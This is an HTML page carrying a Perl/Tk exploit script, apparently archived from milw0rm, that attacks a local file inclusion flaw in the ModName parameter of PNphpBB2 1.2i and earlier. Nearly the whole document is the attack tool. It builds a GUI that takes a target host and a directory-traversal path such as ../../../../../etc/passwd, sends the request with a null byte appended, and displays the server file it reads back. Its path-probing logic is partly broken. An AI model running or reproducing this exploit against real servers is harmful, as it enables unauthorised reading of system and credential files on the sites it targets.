<html><head><title>PNphpBB2 <= 1.2i (ModName) Multiple Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
# PNphpBB2 &lt;= 1.2i (ModName) Multiple LFI Exploit
# by athos - staker[at]hotmail[dot]it

use strict;
use LWP::Simple;
use Tk;

my ($host,$file,$about);

my $poc = &quot;PNphpBB2 &lt;= 1.2i (ModName) Multiple LFI Exploit&quot;;
my $obj = new MainWindow(-background =&gt; '#E4E4E4');

$obj-&gt;title($poc);
$obj-&gt;minsize(500,200);
$obj-&gt;maxsize(500,200);

text('Host/Path (ex: http://localhost/cms)');
input1();
text('Local File (ex: ../../../../../etc/passwd');
input2();
button();
Button();

print $host;

sub text {
   
   my $load = undef;
   my $text = shift;
   
   $load = $obj-&gt;Label(
                  -text  =&gt; $text,
                  -font  =&gt; 'monospace 8',
                  -foreground   =&gt; '#000000',
                  -background   =&gt; '#E4E4E4',
                )-&gt;pack(-anchor =&gt; 'n');
   return $load;           
}


sub input1 {
   
   return $obj-&gt;Entry(
                  -textvariable =&gt; \$host,
                  -font         =&gt; 'monospace 8',
                  -foreground   =&gt; '#000000',
                  -background   =&gt; '#E4E4E4',
                  )-&gt;pack(-anchor =&gt; 'n');
   
}


sub input2 {
   
   return $obj-&gt;Entry(
                  -textvariable =&gt; \$file,
                  -font         =&gt; 'monospace 8',
                  -foreground   =&gt; '#000000',
                  -background   =&gt; '#E4E4E4',
                  )-&gt;pack(-anchor =&gt; 'n');
   
}

sub button {

   return $obj-&gt;Button(
                -text    =&gt; 'Exploit',
                -font    =&gt; 'monospace 8',
                -foreground   =&gt; '#000000',
                -background   =&gt; '#E4E4E4',
                -command =&gt; sub { exploit(); }
               )-&gt;pack(-anchor =&gt; 'n');
}

sub Button {
   
   return $obj-&gt;Button(
                -text    =&gt; 'Credits',
                -font    =&gt; 'monospace 8',
                -foreground   =&gt; '#000000',
                -background   =&gt; '#E4E4E4',
                -command =&gt; sub { about(); }
               )-&gt;pack(-anchor =&gt; 'n');
}

sub exploit {
   
   my $enum = 0;
   my @path = (
             '/admin/admin_words.php?ModName=',
             '/admin/admin_groups_reapir.php?ModName=',
             '/admin/admin_smilies.php?ModName=',
             '/admin/admin_ranks.php?ModName=',
             '/admin/admin_styles.php?ModName=',
             '/admin/admin_users.php?ModName=',
           );  
   
   if(get($path[$enum]) =~ /no such file/i) {
      $enum++;
   }
   else {
      window(get($host.$path[$enum].$file.'%00'));
   }            
}


sub window {
   
   my $A = shift;
   my $T = new MainWindow(-background =&gt; '#E4E4E4');
   
   $T-&gt;title('Exploit Content');
   
   return $T-&gt;Label(
              -text       =&gt; $A,
              -font       =&gt; 'monospace 8',
              -background =&gt; '#E4E4E4',
              -foreground =&gt; '#000000',
            )-&gt;pack(-anchor =&gt; 'n');  
}            

sub about {
   
   $about .= $poc;
   $about .= &quot;\nby athos - staker[at]hotmail[dot]it\r&quot;;
   $about .= &quot;\ndownload on http://www.pnphpbb.com\r&quot;;
   $about .= &quot;\nregister globals  = 1\r&quot;;
   $about .= &quot;\nmagic quotes gpc = 0\r\n&quot;;
   
   my $H = new MainWindow(-background =&gt; '#E4E4E4');
   
   $H-&gt;title('About');
   $H-&gt;minsize(500,200);
   $H-&gt;maxsize(500,200);
   
   return $H-&gt;Label(
              -text       =&gt; $about,
              -font       =&gt; 'monospace 8',
              -background =&gt; '#E4E4E4',
              -foreground =&gt; '#000000',
            )-&gt;pack(-anchor =&gt; 'n');
}



MainLoop;

# milw0rm.com [2009-01-04]</pre></html>